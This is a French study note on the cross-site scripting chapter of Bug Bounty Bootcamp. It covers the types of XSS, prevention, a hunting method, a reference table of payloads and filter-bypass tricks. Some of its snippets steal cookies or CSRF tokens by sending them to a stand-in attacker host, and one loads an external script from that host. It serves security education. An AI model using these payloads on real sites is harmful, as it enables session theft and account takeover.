[⬅ Retour à Bug Bounty Bootcamp](../01_The_Industry/00_General.md)

# Chapitre 6 — Cross-Site Scripting (XSS)

> **Source :** Bug Bounty Bootcamp — Chapitre 6 · **Type :** note-chapitre  
> `#bug-bounty` `#cybersécurité` `#xss` `#web-hacking` `#owasp-top10`

## Résumé

Le XSS est la vulnérabilité la plus reportée sur HackerOne. Elle survient quand une appli échoue à distinguer l'input utilisateur du code légitime de la page, permettant à un attaquant d'exécuter du JavaScript arbitraire dans le navigateur d'une victime.

## Concepts clés

### Mécanisme de base

Si une appli insère l'input utilisateur brut dans le HTML sans validation ni échappement, un payload comme celui-ci s'exécute :

```html
<script>alert('test')</script>
```

Impact possible : vol de cookies/session, modification de la page, redirection malveillante, phishing.

Exemple de vol de cookie :

```html
<script>
image = new Image();
image.src = 'http://attaquant.example/?c=' + document.cookie;
</script>
```

→ Contre-mesure : le flag `HttpOnly` sur un cookie empêche JS d'y accéder.

### Types de XSS

|Type|Où le payload transite|Portée|
|---|---|---|
|**Stored XSS**|Stocké côté serveur (BDD, logs, commentaires), rejoué à chaque affichage|Le plus dangereux — touche tout visiteur de la page, sans clic requis|
|**Blind XSS**|Variante du stored XSS : s'exécute dans une partie invisible pour le testeur (ex: back-office admin)|Difficile à détecter — nécessite un serveur externe pour capter le callback|
|**Reflected XSS**|Renvoyé immédiatement par le serveur dans la réponse HTTP (ex: paramètre de recherche)|Nécessite que la victime clique un lien piégé|
|**DOM-based XSS**|Ne quitte jamais le navigateur — le JS côté client réécrit le DOM à partir de l'input|Le payload n'apparaît jamais dans la réponse HTTP du serveur|
|**Self-XSS**|La victime doit coller elle-même le payload (ingénierie sociale)|Généralement **non accepté** en bug bounty (pas un problème purement technique)|

### Prévention (à connaître pour évaluer la sévérité)

- **Validation d'entrée** + **échappement contextuel en sortie** (encoder `< > & " '` selon le contexte HTML/JS/CSS/URL)
- Frameworks modernes (React, Angular 2+, Vue.js) échappent automatiquement → moins d'XSS "classiques"
- Mitigation en profondeur : cookie `HttpOnly`, en-tête `Content-Security-Policy`

### Méthodologie de chasse

1. **Repérer les points d'injection** — champs stockés (commentaires, profils) pour le stored ; paramètres URL, fragments, chemins pour reflected/DOM. Astuce : insérer une chaîne unique (ex: `XSSTEST123`) dans chaque champ puis chercher (Ctrl+F) si elle réapparaît dans le HTML source
2. **Injecter des payloads de test**
3. **Confirmer l'impact** (pop-up, requête reçue sur son propre serveur pour le blind XSS, etc.)

### Payloads courants (table de référence)

|Payload|Usage|
|---|---|
|`<script>alert(1)</script>`|Payload générique de base|
|`<iframe src=javascript:alert(1)>`|Contourne un filtre qui bloque `<script>`|
|`<body onload=alert(1)>`|Utile si le mot "script" est filtré|
|`"><img src=x onerror=alert(1)>`|Ferme la balise courante puis déclenche via `onerror`|
|`<a onmouseover="alert(1)">test</a>`|Déclenchement au survol|
|`<script src=//attaquant.example/x.js>`|Charge un script externe|
|`javascript:alert(1)`|Scheme d'URL exécutable directement|
|`data:text/html;base64,<payload encodé>`|Contourne certains filtres via un data URI|

### Techniques de contournement de filtre (Bypass XSS)

- **Syntaxe alternative** — éviter `<script>` en injectant dans un attribut d'événement existant (`onerror`, `onload`, `onclick`)
- **Casse et encodage** — `<scrIPT>` passe parfois un filtre sensible à la casse ; `String.fromCharCode()` permet de construire une chaîne sans guillemets, contournant un filtre de caractères spéciaux
- **Erreur de logique du filtre** — si le filtre ne retire `<script>` qu'**une seule fois**, un payload imbriqué comme `<scrip<script>t>` redevient un `<script>` valide une fois le filtre appliqué
- Un **polyglotte XSS** (payload conçu pour s'exécuter dans plusieurs contextes HTML à la fois) augmente les chances de succès sans tester payload par payload

### Escalade d'attaque XSS

- Voler un token [CSRF](09_Cross_Site_Request_Forgery_%28CSRF%29.md) présent sur la page pour agir à la place de la victime :
    
    ```js
    var token = document.getElementById('csrf-token').value;
    fetch('http://attaquant.example/?token=' + token);
    ```
    
- Un stored XSS touchant un **compte admin** peut mener à une compromission totale de l'application
- Peut servir à afficher une fausse page de connexion (phishing) ou rediriger vers un site malveillant

## Liens

- [Bug Bounty Bootcamp](../01_The_Industry/00_General.md)
- [Chapitre 5](../02_Basics/05_Recon.md)
- Stored XSS
- Reflected XSS
- DOM-based XSS
- Bypass XSS
- [Cross-Site Request Forgery (CSRF)](09_Cross_Site_Request_Forgery_%28CSRF%29.md)
- OWASP
